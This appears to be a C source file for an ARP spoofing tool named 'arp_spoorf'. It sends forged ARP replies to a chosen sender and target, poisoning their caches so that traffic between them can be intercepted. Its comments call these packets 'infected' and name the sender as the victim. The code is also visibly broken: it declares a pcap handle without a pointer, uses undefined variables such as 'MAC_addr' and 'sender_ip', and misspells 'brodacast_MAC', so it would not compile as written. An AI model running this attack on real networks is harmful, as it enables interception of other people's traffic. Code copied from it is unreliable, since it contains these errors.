#include "arp_lib.h"

int main(int argc, char *argv[])
{
	pcap_t handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	uint8_t my_MAC[6] = {0,};
	uint8_t senders_MAC[6] = {0,};
	uint8_t broadcast_MAC[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
	uint8_t target_MAC[6] = {0,};
	struct in_addr my_IP;
	struct in_addr senders_ip;
	struct in_addr target_ip;

	
	
	if(argc != 4)
	{
		printf("Usage: ./arp_spoorf [interface] [sender_ip] [target_ip]");
		return 0;
	}
	
	inet_aton(argv[2], &senders_ip);
	inet_aton(argv[3], &target_ip);
	
	handle = pcap_open_live(argv[1],BUFSIZ,1,1000,errbuf);
	get_addr(my_MAC, &my_IP, argv[1]);

	rs_ARP(handle, my_MAC, broadcast_MAC, &my_IP, &senders_ip,1); //broadcast_request

	get_senders_mac(handle, &senders_ip,senders_MAC);

	rs_ARP(handle, MAC_addr, senders_MAC, &target_ip, &sender_ip,2); // send_infected_packet to victim
	
	// infec senders network
	
	rs_ARP(handle, my_MAC, brodacast_MAC, &my_IP, &senders_ip,1); 
	get_senders_mac(handle, &target_ip, target_MAC); // get target's mac address

	rs_ARP(handle, MAC_addr, target_MAC, &senders_ip, &target_ip,2);

}
